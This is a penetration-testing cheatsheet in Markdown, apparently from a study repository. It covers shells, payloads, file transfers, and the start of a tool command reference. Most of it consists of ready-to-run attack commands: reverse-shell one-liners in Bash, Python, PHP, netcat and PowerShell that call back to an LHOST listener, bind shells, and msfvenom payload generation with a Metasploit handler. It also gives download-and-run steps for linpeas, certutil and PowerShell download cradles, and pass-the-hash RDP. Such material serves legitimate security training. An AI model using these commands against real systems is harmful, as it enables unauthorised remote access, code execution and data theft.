# Shells and Payloads Cheatsheet [← Cheatsheet index](README.md) | [Full procedure](../reference/04-shells-transfers-credentials/02-shells-and-payloads.md) | [Payload obstacles](payload-execution.md) | [Public exploits](public-exploits.md) | [Strategy map](../notes/Attack_Strategy_Map.md) | Study methods: [Establish sessions and move files](../notes/methods/sessions-transfers.md) ## State model ```text delivery → execution → connection → usable session ``` Prove each transition separately. A hung request is not a shell; a TCP connection is not necessarily an interactive session. ## Choose access | Evidence | Choose | | --- | --- | | One bounded command is enough | Direct execution | | Valid credential + enabled remote service | SSH/WinRM/RDP | | Target can reach Kali | Reverse shell | | Kali can reach a target listener | Bind shell | | Staged/protocol-aware payload | Matching `multi/handler` | ## Listener > **Run/context:** start the listener on the endpoint the target can reach; run the selected connection command in the confirmed execution context. **Decide:** a TCP connection is not yet an interactive command session. Use the [callback ladder](#callback-ladder) for a missing or unusable connection, then [verify host and identity](#verify-session) inside the new session. Traditional/OpenBSD-style Netcat: ```bash rlwrap nc -lvnp LPORT ``` Nmap Ncat: ```bash ncat -4 -lvn 0.0.0.0 LPORT ``` Verify: ```bash ss -lntp | grep ':LPORT' ``` > Select `LHOST` from the target's route. Confirm the listener is not bound only to loopback or the wrong interface/address family. ## Linux reverse shells ```bash bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' ``` ```bash python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' ``` ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f ``` ```bash php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' ``` Ncat transferred to target: ```bash ncat LHOST LPORT --exec /bin/sh ``` > If the injection launches `/bin/sh`, wrap Bash-only syntax in `bash -c '...'` and encode it for each outer parser. ## Windows command channels Prefer authenticated access when available: ```bash evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ssh -p PORT USER@TARGET ``` Transferred Ncat: ```cmd ncat.exe LHOST LPORT --exec cmd.exe ``` PowerShell TCP channel: ```powershell $client = [Net.Sockets.TcpClient]::new('LHOST',LPORT) $stream = $client.GetStream() $buffer = New-Object byte[] 65535 while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count) $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> " $bytes = [Text.Encoding]::ASCII.GetBytes($output) $stream.Write($bytes,0,$bytes.Length) $stream.Flush() } $client.Close() ``` PowerShell nested-quoting transport: ```powershell $command = 'COMMAND' [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) ``` ```cmd powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE ``` > `-EncodedCommand` requires UTF-16LE. Base64 is representation, not encryption or AV evasion. ## Bind shells ```bash # target, only if this nc build supports -e nc -lvnp PORT -e /bin/sh # Kali nc -nv TARGET PORT ``` Ncat target: ```bash ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh ``` FIFO fallback: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f ``` ## Msfvenom selection ```bash msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options ``` Stageless command shells: ```bash msfvenom -p linux/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp LHOST=LHOST LPORT=LPORT -f exe -o shell.exe file shell.elf shell.exe sha256sum shell.elf shell.exe ``` Naming cue: ```text shell_reverse_tcp = stageless/all-in-one shell/reverse_tcp = staged; needs a matching staging handler ``` Handler: ```text msfconsole -q use exploit/multi/handler set payload PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show options run ``` > Generated payload, handler payload, transport, LHOST and LPORT must match exactly. Encoders do not guarantee AV evasion. ## Callback ladder 1. Prove delivery. 2. Prove `id`/`whoami` or another harmless command in the vulnerable context. 3. Repair parser, quoting, encoding, interpreter and length. 4. Match OS, architecture, format and staged/stageless type. 5. Start and verify the listener before triggering. 6. Test target-to-`LHOST:LPORT` reachability. 7. Gather concrete security-control evidence. 8. Repair TTY/I/O only after a connection exists. Target checks: ```bash nc -vz LHOST LPORT curl -v --connect-timeout 5 http://LHOST:LPORT/ ``` ```powershell Test-NetConnection LHOST -Port LPORT -InformationLevel Detailed ``` Kali observation: ```bash sudo tcpdump -ni any tcp port LPORT ``` | Packet/session evidence | Meaning | | --- | --- | | No SYN | Execution/LHOST/route/egress/parser problem | | SYN but no response | Listener bind/port/local firewall problem | | Handshake then close | Crash, handler mismatch or control interference | | Stable connection, no commands | Staged/raw mismatch, buffering or I/O issue | ## Security-control triage ```powershell Get-MpComputerStatus | Select-Object AntivirusEnabled,RealTimeProtectionEnabled,BehaviorMonitorEnabled,IoavProtectionEnabled ``` Separate: transfer failure, quarantine, process denial, script-content block, crash, callback filtering, application control, language mode, permissions and missing dependencies. Do not call every silent failure “AV.” ## TTY upgrade ```bash python3 -c 'import pty; pty.spawn("/bin/bash")' # Ctrl-Z locally stty raw -echo; fg # remote reset export TERM=xterm-256color stty rows 40 columns 120 ``` Recovery on Kali: ```bash stty sane ``` Socat: ```bash # Kali socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr # target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT ``` ## Verify session ```bash hostname; id; pwd; ip addr; ip route; ss -lntup ``` ```cmd hostname whoami /all cd ipconfig /all route print netstat -ano ``` ## Handoff - Need a file → [file transfer](../reference/04-shells-transfers-credentials/01-file-transfer.md). - New credential → [credential sheet](credentials-cracking.md). - Local shell → [Linux](linux-privesc.md) or [Windows](windows-privesc.md) privilege escalation. - Internal interface/route → [pivoting](pivoting.md). - Public PoC still failing before command execution → [public exploit sheet](public-exploits.md). - Document/shortcut, execution-policy, application-control or handler/module failure → [payload execution](payload-execution.md). ## Discover and recognize candidates Use these discovery checks to find a candidate, then validate the missing conditions. Cues are illustrative; complete synthetic outputs and three-outcome examples are in the linked study entries. ### Establish sessions and move files
Find: Verify command execution, host and represented identity Begin with the original command/PoC/client result and request a small host/identity proof through its existing output channel. ```bash hostname id pwd ``` > **Recognize:** Host-specific identity output demonstrates execution under that account, not yet a reverse connection or full terminal. > **Validate next:** Record OS, privilege and network position; choose an access form whose interpreter/service and route exist. [Verify command execution, host and represented identity](../notes/methods/sessions-transfers.md#session-proof).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. A functioning execution primitive and an observable output or controlled side effect ```text delivery → execution → connection → usable session ``` | State | Decisive evidence | Does not yet prove | | --- | --- | --- | | Delivery | Exact bytes/request reached intended consumer | Payload executed | | Execution | Harmless command output or controlled side effect | Network callback works | | Connection | Listener records the expected peer | Commands and I/O are usable | | Session | Commands return and host/identity are verified | Higher privilege or stability | Do not change all four layers at once. Preserve the last confirmed state and test the next boundary. | Situation | Prefer | Main prerequisite / limitation | | --- | --- | --- | | One bounded action is enough | Direct command execution | Observable output or side effect; no shell required | | Valid credential and remote service | SSH, WinRM or RDP | Authentication plus remote-logon authorization | | Target can reach Kali | Reverse shell | Target egress and a reachable Kali listener | | Kali can reach a target listener | Bind shell | Target can bind and inbound path permits it | | Payload is staged or protocol-aware | Matching framework handler | Handler must use the exact payload/transport | Prefer authenticated administrative access when it is already available: it is normally more stable, auditable and feature-complete than an improvised shell. Linux: ```bash id; hostname; pwd ``` Windows: ```cmd whoami & hostname & cd ``` For blind execution, use one bounded callback or file side effect that the current context can produce and you can independently observe. Do not interpret a hung HTTP request as proof of a shell; the server may simply be waiting on a child process or timeout. Linux: ```bash hostname; id; pwd ip addr; ip route ss -lntup ``` Windows: ```cmd hostname whoami /all cd ipconfig /all route print netstat -ano ``` Record the destination host, actual identity, privilege, current directory, interfaces/routes, parent/execution context and the exact command that produced the session. Then re-enumerate from the new state. ```text exact prerequisites → exploit reaches expected vulnerable path → bounded harmless effect or identity output → repeatable command execution → payload reaches listener → usable session → verified host/identity/privilege/network position ``` Do not accept the exploit's own “success” string as proof. Validate an independent effect. An HTTP `200`, uploaded filename, connection or application crash each proves less than a verified command result. > **Verify:** Save destination identity/hostname and actual command output; use Windows hostname/whoami/ipconfig when appropriate. > **If it fails:** A hung request or success message does not prove execution. First establish a bounded observable effect, then diagnose the next state.
Find: Connect a Linux reverse shell through an available interpreter From the proven Linux command channel inspect available interpreters and the target's route to the proposed listener. ```bash command -v bash python3 php nc ip route get LHOST ``` > **Recognize:** An interpreter plus a plausible outbound route suggests a reverse-channel candidate. > **Validate next:** Verify target-to-listener reachability, listener binding, exact shell/parser and payload compatibility. [Connect a Linux reverse shell through an available interpreter](../notes/methods/sessions-transfers.md#session-reverse).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. A confirmed Bash/Python/PHP/Netcat implementation, correct parser wrapping, target-to-listener route and compatible listener ```text trigger context → target process/interpreter and architecture → target source interface → route/egress controls → LHOST address visible from target → LPORT → local bind interface → listener/handler ``` Select `LHOST` from the target's point of view. A VPN address, tunnel endpoint or reachable interface may be correct while Kali's default-route address is wrong. On Kali: ```bash ip -brief address ip route ss -lntp ``` Windows source/listener checks: ```powershell Get-NetIPAddress -AddressFamily IPv4 Get-NetRoute -AddressFamily IPv4 Get-NetTCPConnection -State Listen ``` Traditional/OpenBSD-style `nc` commonly used on Kali: ```bash rlwrap nc -lvnp LPORT ``` Nmap Ncat uses a positional listen port; do not mechanically copy every `nc` flag: ```bash ncat -4 -lvn 0.0.0.0 LPORT ``` Verify the bind in another terminal: ```bash ss -lntp | grep ':LPORT' ``` If multiple interfaces exist, bind deliberately: ```bash ncat -4 -lvn LHOST LPORT ``` > **Failure cue:** a listener bound only to `127.0.0.1`, the wrong VPN/interface address or the wrong address family cannot receive the expected callback. “Address already in use” means another process owns the bind. Choose an interpreter that you confirmed exists. Bash TCP: ```bash bash -c 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1' ``` Python 3 with a PTY: ```bash python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("LHOST",LPORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")' ``` Portable FIFO plus Netcat when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc LHOST LPORT >/tmp/f ``` PHP CLI: ```bash php -r '$s=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");' ```
Variant — target has Ncat command execution Linux: ```bash ncat LHOST LPORT --exec /bin/sh ``` Windows: ```cmd ncat.exe LHOST LPORT --exec cmd.exe ``` `--exec` exposes the named program directly to the network connection. Use only on the assigned host and remove transferred tooling when the exercise requires cleanup.
> **Shell-language cue:** a command injection may execute through `/bin/sh`, which does not understand every Bash construct. Wrap Bash-specific syntax in `bash -c '...'` and then encode it for the outer HTTP/template/database layer. > **Verify:** Run hostname/id through the returned channel and distinguish a TCP connection from a functioning shell. > **If it fails:** No packets suggests route/listener/trigger; packets without commands suggest payload/listener mismatch. Check the first failed boundary.
Find: Use Windows authenticated access or a PowerShell command channel From Windows execution inspect the actual PowerShell/runtime context and any reachable authenticated remote service before building a callback. ```powershell whoami /all $PSVersionTable $ExecutionContext.SessionState.LanguageMode ``` > **Recognize:** The execution identity and constrained language context affect which command-channel implementations can run. > **Validate next:** Check permitted language features, remote endpoint authorization or a working callback route; encoding does not grant those. [Use Windows authenticated access or a PowerShell command channel](../notes/methods/sessions-transfers.md#session-windows).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Accepted remote-service rights or compatible PowerShell execution; correct encoding, policy context and callback route Prefer an available authenticated service: ```bash evil-winrm -i TARGET -u USER -p 'PASSWORD' xfreerdp /v:TARGET /u:'DOMAIN\USER' /p:'PASSWORD' /cert:ignore ssh -p PORT USER@TARGET ``` PowerShell TCP shell when direct command execution is the only primitive: ```powershell $client = [Net.Sockets.TcpClient]::new('LHOST',LPORT) $stream = $client.GetStream() $buffer = New-Object byte[] 65535 while (($count = $stream.Read($buffer,0,$buffer.Length)) -gt 0) { $command = [Text.Encoding]::ASCII.GetString($buffer,0,$count) $output = (Invoke-Expression $command 2>&1 | Out-String) + "PS $((Get-Location).Path)> " $bytes = [Text.Encoding]::ASCII.GetBytes($output) $stream.Write($bytes,0,$bytes.Length) $stream.Flush() } $client.Close() ``` > This is a basic command channel, not a ConPTY. Host policy, language mode, AMSI/antimalware, quoting and the parent process can affect it. PowerShell `-EncodedCommand` solves nested quoting; it is not encryption or an AV bypass. Generate UTF-16LE Base64 locally: ```powershell $command = 'COMMAND' $encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($command)) $encoded ``` Invoke in the target command context: ```cmd powershell.exe -NoProfile -NonInteractive -EncodedCommand BASE64_UTF16LE ``` > **Verify:** Verify hostname, whoami /all and command behavior through the resulting channel. > **If it fails:** A saved credential may be valid for one protocol only. PowerShell policy, language mode, parser and antimalware evidence require different responses.
Find: Use a bind shell when the target can accept inbound connections Inspect target-side listening permissions, tool implementation and the assessment-source route to a proposed listener. ```bash nc -h ss -lnt ``` > **Recognize:** The implementation cannot use an assumed -e shell; another supported listener mechanism is needed. > **Validate next:** Confirm a compatible bind command, permitted listener and inbound source-to-target reachability. [Use a bind shell when the target can accept inbound connections](../notes/methods/sessions-transfers.md#session-bind).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Permission to bind, compatible Netcat/Ncat behavior and source-to-target listener connectivity through any required forward Use a bind shell only when Kali can reach a target listener and reverse egress is unavailable. Traditional Netcat with `-e` support on a Linux target: ```bash nc -lvnp PORT -e /bin/sh ``` Connect from Kali: ```bash nc -nv TARGET PORT ``` FIFO alternative when `-e` is absent: ```bash rm -f /tmp/f; mkfifo /tmp/f cat /tmp/f | /bin/sh -i 2>&1 | nc -lvnp PORT >/tmp/f ``` Ncat target listener: ```bash ncat -4 -lvn 0.0.0.0 PORT --exec /bin/sh ``` > Bind shells expose a target port and may be blocked by the host firewall or upstream ACL. A successful local bind does not prove Kali can reach it. > **Verify:** Verify reachable listener plus hostname/id over the channel; record and later remove the created listener. > **If it fails:** A target-side listener with client timeout implies a route/firewall boundary. Use an appropriate forward or another allowed access form.
Find: Generate a payload matching OS, process, format and handler Inspect the actual consumer/process and existing exploit constraints before browsing payload names or formats. ```bash file TARGET_ARTIFACT msfvenom -l payloads msfvenom --list formats ``` > **Recognize:** The staged payload name and executable consumer must be matched to the handler and delivery format. > **Validate next:** Check target/process architecture, permitted feature, exact payload options, stage route and listener. [Generate a payload matching OS, process, format and handler](../notes/methods/sessions-transfers.md#payload-generate).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Verified target/process architecture, delivery format, callback route, payload constraints and a matching staged/stageless listener List rather than guess names and formats: ```bash msfvenom -l payloads | grep -E 'linux|windows' | grep -E 'x64|x86' msfvenom --list formats msfvenom -p PAYLOAD_NAME --list-options ``` Stageless command-shell binaries: ```bash msfvenom -p linux/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f elf -o shell.elf msfvenom -p windows/x64/shell_reverse_tcp \ LHOST=LHOST LPORT=LPORT \ -f exe -o shell.exe ``` Verify the resulting artifacts: ```bash file shell.elf shell.exe sha256sum shell.elf shell.exe ``` > `msfvenom` does not make a payload compatible with the delivery path. Match target OS, process architecture, payload type, output format, available execution method and callback route. ##### Staged versus stageless ```text stageless: complete payload delivered at once; larger, usually simpler and more stable staged: small first stage connects and retrieves the rest; smaller initial footprint, needs matching handler and second transfer ``` Metasploit naming commonly reflects the distinction: ```text windows/x64/shell_reverse_tcp stageless windows/x64/shell/reverse_tcp staged ``` A raw Netcat listener can receive many ordinary stageless command shells. A staged payload normally needs `multi/handler` configured with the exact same payload: ```text msfconsole -q use exploit/multi/handler set payload PAYLOAD_NAME set LHOST LHOST set LPORT LPORT show options run ``` > A connection to Netcat with no usable commands can mean a staged payload reached a non-staging listener. It is not necessarily failed code execution. ##### Existing-PoC payload constraints Only when an existing reviewed PoC documents payload space and bad characters: ```bash msfvenom -p PAYLOAD_NAME \ LHOST=LHOST LPORT=LPORT \ -f FORMAT -v VARIABLE \ -b 'BAD_CHARACTERS' \ -s MAX_SPACE ``` Encoders and repeated encoding do not guarantee antimalware evasion. `-b` is for bytes that the vulnerable input path cannot preserve; do not invent a universal bad-character list. > **Verify:** Check artifact format/hash and actual session identity; generation success is not execution proof. > **If it fails:** Wrong architecture, stage/handler mismatch, missing second route or payload-space constraints require separate fixes. Encoding does not guarantee endpoint-control bypass.
Find: Repair a limited Linux terminal Inspect the working shell's terminal state and available PTY utilities after verifying a stable command channel. ```bash tty command -v python3 script socat ``` > **Recognize:** A functioning socket shell lacks a controlling terminal while a potential PTY mechanism exists. > **Validate next:** Verify the available PTY mode, local terminal handling and stable connection; privilege remains unchanged. [Repair a limited Linux terminal](../notes/methods/sessions-transfers.md#session-tty).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. A working channel and available PTY mechanism; correct local-terminal control sequence First obtain a PTY with an available interpreter: ```bash python3 -c 'import pty; pty.spawn("/bin/bash")' ``` Press `Ctrl-Z` locally, then: ```bash stty raw -echo; fg ``` Back in the remote shell: ```bash reset export TERM=xterm-256color stty rows 40 columns 120 ``` If the local terminal becomes unreadable, restore it from a separate/local shell: ```bash stty sane ``` Socat can provide a stronger PTY when present on both sides: ```bash # Kali socat file:$(tty),raw,echo=0 tcp-listen:LPORT,reuseaddr # Target socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:LHOST:LPORT ``` > TTY repair changes terminal behavior, not privilege or network reliability. A PTY may enable job control and programs that require a terminal; it does not turn a fragile route into a stable one. > **Verify:** Check tty, signal handling and an interactive program; confirm the same identity remains. > **If it fails:** A dropped connection is not solved by terminal settings. If no PTY mechanism exists, use noninteractive commands or an authenticated terminal method.
Find: Transfer over HTTP using Linux or Windows clients From the target's command context inspect downloader availability, writable destination and a route to the fixed served directory. ```bash command -v curl wget ls -ld /tmp ip route get LHOST ``` > **Recognize:** A downloader, destination and plausible outbound path enable an HTTP transfer candidate. > **Validate next:** Check actual server bind/directory, HTTP request/response and source/destination hashes. [Transfer over HTTP using Linux or Windows clients](../notes/methods/sessions-transfers.md#transfer-http).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Correct server bind and served directory; target-to-server route, available downloader and writable destination On Kali, serve the directory containing `linpeas.sh`: ```bash cd /path/to/tools python3 -m http.server 8000 --bind 0.0.0.0 ``` On the Linux target, download into a writable directory and run it: ```bash wget http://LHOST:8000/linpeas.sh -O /tmp/linpeas.sh chmod +x /tmp/linpeas.sh /tmp/linpeas.sh | tee /tmp/linpeas.txt ``` > **Read:** Kali should log an HTTP request and a successful response. A downloaded enumeration script is a lead generator; manually verify any escalation candidate.
HTTP variants — fixed server directory, curl, Windows and alternate built-ins ##### Serve a fixed directory without changing folders ```bash python3 -m http.server 8000 --bind 0.0.0.0 --directory /path/to/tools ``` Python's simple server supplies downloads over unencrypted HTTP. Stop it with `Ctrl+C` when finished. ##### Linux target with curl ```bash curl -fL http://LHOST:8000/FILE -o /tmp/FILE ``` `-f` reports HTTP errors and `-L` follows redirects. Use a writable destination. ##### Windows target with PowerShell Run inside PowerShell: ```powershell Invoke-WebRequest -Uri "http://LHOST:8000/FILE" -OutFile "C:\Windows\Temp\FILE" ``` From `cmd.exe`, invoke PowerShell explicitly: ```cmd powershell -NoProfile -Command "Invoke-WebRequest -Uri 'http://LHOST:8000/FILE' -OutFile 'C:\Windows\Temp\FILE'" ``` ##### Windows alternatives ```powershell (New-Object Net.WebClient).DownloadFile('http://LHOST:8000/FILE','C:\Windows\Temp\FILE') ``` ```cmd curl.exe -fL http://LHOST:8000/FILE -o C:\Windows\Temp\FILE ``` ```cmd certutil.exe -urlcache -split -f http://LHOST:8000/FILE C:\Windows\Temp\FILE ``` Availability and policy can differ by host. `certutil` may leave URL-cache artifacts; remove only artifacts you created when cleanup is appropriate.
Compare the source and destination hashes. On Kali or Linux: ```bash sha256sum FILE sha256sum /tmp/FILE ``` On Windows: ```powershell Get-FileHash -Algorithm SHA256 "C:\Windows\Temp\FILE" ``` > **Decisive output:** matching SHA-256 values establish that the two saved files contain the same bytes. A successful HTTP status alone does not. > **Verify:** Compare sha256sum on Linux or Get-FileHash -Algorithm SHA256 on Windows, and verify destination permissions. > **If it fails:** No request: route/bind/egress. 404: path/name. Matching file but no execution: interpreter/format/control. Diagnose each separately.
Find: Copy files through an authenticated SSH service Use established SSH context to identify allowed file/subsystem access and the intended remote destination's rights. ```bash ssh -v -p PORT USER@TARGET ``` > **Recognize:** SSH authentication gives a candidate transport; it does not prove SFTP/subsystem support or destination write. > **Validate next:** Validate client/server subsystem compatibility, source read and destination write; inspect resulting bytes. [Copy files through an authenticated SSH service](../notes/methods/sessions-transfers.md#transfer-scp).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Reachable SSH/SFTP service, correct key/password and read/write rights; client/server subsystem compatibility
SCP — copy through an authenticated SSH service ##### Kali to a Linux target ```bash scp FILE USER@TARGET:/tmp/FILE ``` ##### Linux target to Kali Run from Kali when the target's SSH service is reachable: ```bash scp USER@TARGET:/path/to/FILE ./FILE ``` ##### SSH key or nonstandard port ```bash scp -i KEY -P PORT FILE USER@TARGET:/tmp/FILE ``` `scp` uses uppercase `-P` for the SSH port. Authentication success does not guarantee write permission at the destination path.
> **Verify:** Verify copied bytes and location; uppercase -P selects scp's SSH port. > **If it fails:** Authentication failure, missing subsystem and destination permission failure need different changes. Prefer a supported transfer method over guessing flags.
Find: Move Windows files through an authenticated SMB share From Windows inspect TCP/445 reachability to the deliberate transfer server and distinguish its share identity from target-domain credentials. ```powershell Test-NetConnection LHOST -Port 445 net use ``` > **Recognize:** The service is reachable, but an existing connection can constrain a different credential context. > **Validate next:** Verify intended share/server credentials, conflicting mappings, read/write rights and destination hash. [Move Windows files through an authenticated SMB share](../notes/methods/sessions-transfers.md#transfer-smb).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Inbound SMB listener on the server, outbound TCP/445 from the client, compatible SMB version and explicit share credentials
SMB — read and write files from Windows ##### Start an authenticated SMB share on Kali ```bash mkdir -p share sudo impacket-smbserver transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' ``` The first positional value is the share name; the second is its local directory. The supplied `USER` and `PASSWORD` authenticate to this temporary Kali share. Some installations expose the legacy wrapper name: ```bash sudo smbserver.py transfer "$(pwd)/share" -smb2support -username USER -password 'PASSWORD' ``` ##### Connect and download from Windows ```cmd net use \\LHOST\transfer /user:USER "PASSWORD" copy \\LHOST\transfer\FILE C:\Windows\Temp\FILE ``` ##### Upload evidence from Windows to Kali ```cmd copy C:\Windows\Temp\FILE \\LHOST\transfer\FILE net use \\LHOST\transfer /delete ``` Kali must accept inbound TCP/445 and the target must permit outbound SMB. The share is read/write unless started with Impacket's `-readonly` option.
> **Verify:** Verify source/destination hash and the share path; disconnect created mappings after use. > **If it fails:** No route, conflicting cached connection, invalid share credentials and denied filesystem writes are independent failure points.
Find: Stream a file over a direct TCP connection When richer transfers are unavailable, inspect the exact TCP tool and draw sender, receiver and writable output destination. ```bash nc -h ls -ld /DESTINATION_DIRECTORY ``` > **Recognize:** A raw stream may move bytes only if roles and connection direction are correct; no integrity metadata is supplied. > **Validate next:** Confirm listener syntax, reachability, binary-clean I/O and a complete independent hash match. [Stream a file over a direct TCP connection](../notes/methods/sessions-transfers.md#transfer-stream).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Unambiguous sender/receiver direction, compatible Netcat listener syntax and a writable output file
Netcat — stream a file when a direct TCP connection is possible ##### Retrieve a file from the target to Kali Kali receives: ```bash nc -lvnp PORT > FILE ``` The target sends: ```bash nc -nv LHOST PORT < /path/to/FILE ``` ##### Send a file from Kali to the target The target receives: ```bash nc -lvnp PORT > /tmp/FILE ``` Kali sends: ```bash nc -nv TARGET PORT < FILE ``` If the listener rejects `-p`, use the OpenBSD-style form and check `nc -h` locally: ```bash nc -lvn PORT > FILE ``` Netcat provides no authentication, encryption, filename metadata or integrity check. Confirm direction and compare hashes afterward.
> **Verify:** Compare hashes and avoid mixing diagnostic text into the file stream. > **If it fails:** A connection without a complete hash match proves only transport. Use SCP/HTTP/SMB when those routes exist.
Find: Move a small artifact through a text-only channel Inspect the existing channel's command-length/quoting limits and whether both sides can reconstruct a small encoded file. ```bash command -v base64 wc -c FILE ``` > **Recognize:** A small artifact and compatible decoder make text transport plausible, without assuming large encoded commands survive. > **Validate next:** Verify exact length/quoting and source/destination hash; use the Windows decoding variant when appropriate. [Move a small artifact through a text-only channel](../notes/methods/sessions-transfers.md#transfer-text).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. Available Base64 encode/decode, adequate command length and a writable destination
Base64 — move a small file through a text-only channel ##### Encode on Linux ```bash base64 -w 0 FILE ``` ##### Decode on Linux ```bash printf '%s' 'BASE64_DATA' | base64 -d > /tmp/FILE ``` ##### Decode in PowerShell ```powershell [IO.File]::WriteAllBytes('C:\Windows\Temp\FILE',[Convert]::FromBase64String('BASE64_DATA')) ``` Use this for small files. Long encoded values are easy to truncate or corrupt; compare hashes.
> **Verify:** Require a complete matching hash; keep encoded secrets in private evidence rather than reusable notes. > **If it fails:** Truncation, wrapping and quoting often corrupt long values. Use a network transfer for larger files.
Find: Use a temporary FTP transfer as a constrained fallback Inspect whether a compatible FTP client is the remaining route and whether the temporary server's data channel is reachable. ```text ftp help quit ``` > **Recognize:** Client availability permits investigating FTP; binary mode and separate data-channel paths remain necessary. > **Validate next:** Verify deliberate server scope, control/data connectivity, required read/write and post-transfer hashes. [Use a temporary FTP transfer as a constrained fallback](../notes/methods/sessions-transfers.md#transfer-ftp).
Commands and use-case variants > **Need:** Verified command execution or authenticated remote access and a known network path. A deliberately selected temporary server, correct served directory, control/data paths and binary transfer mode
Temporary FTP — only when an FTP client is the available route On Kali, after intentionally selecting/installing `pyftpdlib` in an isolated environment: ```bash python3 -m pyftpdlib -p PORT ``` On the target: ```text ftp LHOST PORT binary get FILE put FILE quit ``` The default temporary server can be unauthenticated and plaintext. Bind/serve only the intended directory, expose it only for the transfer, compare hashes and stop it immediately. HTTP/SCP/SMB are normally preferable.
> **Verify:** Compare bytes and stop the temporary server after its purpose is complete. > **If it fails:** A working control session with failed data transfer requires data-channel troubleshooting. Choose HTTP/SCP/SMB when available.

# Tool Command Reference

[← Cheatsheet index](README.md) | [Selection matrix](tool-selection.md) | [getSH coverage](../notes/GetSH_Coverage.md) | [Strategy map](../notes/Attack_Strategy_Map.md)

This sheet accounts for the tools listed by the reviewed getSH Tool Cheatsheet. The linked task procedures remain canonical because they include prerequisites, interpretation and failure routing.

## Recon and scanning

### Nmap

```bash
nmap -Pn -sS -p- TARGET -oA full-tcp
nmap -Pn -sV -sC -p PORTS TARGET -oA services
sudo nmap -Pn -sU --top-ports 100 TARGET -oA udp-100
```

> Direct/raw scanning baseline; connect scan `-sT` when raw packets are unavailable or through a TCP SOCKS route. [Procedure](../reference/01-discovery-scanning/README.md)

### RustScan and Masscan

```bash
rustscan -a TARGET -r 1-65535 --ulimit 5000 -- -Pn -sV -sC -oA rustscan-followup
sudo masscan TARGET -p1-65535 --rate 500 -oL masscan.txt
```

> Validate fast-discovery hits with Nmap; neither command covers UDP. [Procedure](../reference/01-discovery-scanning/07-scanner-alternatives.md)

### ffuf, Gobuster and Feroxbuster

```bash
ffuf -w WORDLIST -u http://TARGET:PORT/FUZZ -ac -o ffuf.json
gobuster dir -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o gobuster.txt
feroxbuster -u http://TARGET:PORT/ -w WORDLIST -x php,txt,bak,old,zip -o ferox.txt
```

> Calibrate against random paths; results are candidates. [Web mapping](web-mapping.md)

### Nikto

```bash
nikto -h http://TARGET:PORT -output nikto.txt
```

> Manually reproduce useful candidates. [Procedure](../reference/01-discovery-scanning/07-scanner-alternatives.md)

## Service tools

### SMB and RPC

```bash
smbclient -L //TARGET -N
smbclient //TARGET/SHARE -U 'DOMAIN/USER'
rpcclient -U '' -N TARGET
nxc smb TARGET -d DOMAIN -u USER -p 'PASSWORD' --shares
```

> Null, guest and authenticated views differ. [SMB procedure](../reference/02-service-enumeration/06-smb-rpc.md)

### ldapsearch

```bash
ldapsearch -x -LLL -H ldap://DC_IP:389 -s base -b '' defaultNamingContext dnsHostName
ldapsearch -x -LLL -H ldap://DC_HOST:389 -D 'USER@DOMAIN' -W -b 'DC=DOMAIN,DC=TLD' '(objectClass=user)' sAMAccountName memberOf
```

> [LDAP/Kerberos procedure](../reference/02-service-enumeration/11-ldap-kerberos.md)

### FreeRDP

```bash
xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard
xfreerdp3 /v:TARGET_HOST /d:DOMAIN /u:USER /pth:NT_HASH /cert:ignore /dynamic-resolution

# Older package name
xfreerdp /v:TARGET_HOST /d:DOMAIN /u:USER /p:'PASSWORD' /cert:ignore /dynamic-resolution +clipboard
```

